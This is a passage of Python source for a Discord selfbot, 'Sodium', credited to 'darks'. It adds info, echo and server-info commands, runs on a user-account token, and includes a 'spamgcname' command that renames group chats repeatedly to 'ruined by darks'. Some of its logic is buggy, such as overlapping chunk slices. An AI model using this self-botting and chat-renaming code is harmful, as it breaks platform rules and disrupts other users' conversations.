        "- NOTE => SOME COMMANDS ARE NON PREFIX & SOME REQUIRE PREFIX, IN FUTURE UPDATES THOSE COMMANDS WILL WORK WITHOUT PREFIX```"
        "```yml\n"
        "!  CREATED BY darks.4sure. & t97q.  !```**")
    await ctx.message.delete()
    await ctx.send(lol)        
        
# ROLE INFO
@darks.command()
async def roleinfo(ctx, *, role: discord.Role):
    role_info = f"• **Role Name:** {role.name}\n"
    role_info += f"• **Role ID:** {role.id}\n"
    role_info += f"• **Role Color:** {role.color}\n"
    role_info += f"• **Role Created At:** {role.created_at}\n"
    role_info += f"• **Role Members:** {len(role.members)}\n"
    role_info += f"• **Role Permissions:** {role.permissions.value}\n"

    await ctx.send(role_info)        
        
# SAY
@darks.command(name="say")
async def say(ctx, *, message):
    await ctx.send(message)    

# SERVER INFO.
@darks.command(aliases=["si"])
async def send_serverinfo_message(channel):
    guild = channel.guild 
    await channel.send(
        f"**╭・⌬・Sodium S3LFB0T**\n\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・ `SERVER NAME` : {guild.name}**\n**[+]・ `GUILD ID` : {guild.id}**\n**[+]・ `CREATED AT` : {channel.guild.created_at}**\n**[+]・ `OWNED BY` : <@{guild.owner_id}>**\n**[+]・ `REIGON` : {guild.region}**\n\n**[+]・Request creator : {darks.user.name}**\n\n**[+]・__Created by - Darks__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )        
        

             
        
@darks.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "DARKS LOL"
        name = "ruined by darks"
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)        
        
@darks.command()
async def all(ctx):
    commands_list = [command.name for command in darks.commands]
    chunks = [commands_list[i:i+50] for i in range(0, len(commands_list), 10)]
    
    for chunk in chunks:
        message = f'{", ".join(chunk)}'
        await ctx.send(message.format(command=darks.command_prefix))        
        
        

"""    __   __  __  _ _  _ __ __  
/' _/ /__\| _\| | || |  V  | 
`._`.| \/ | v | | \/ | \_/ | 
|___/ \__/|__/|_|\__/|_| |_| """


if __name__ == "__main__":
    darks.run(Duudu,bot=False) 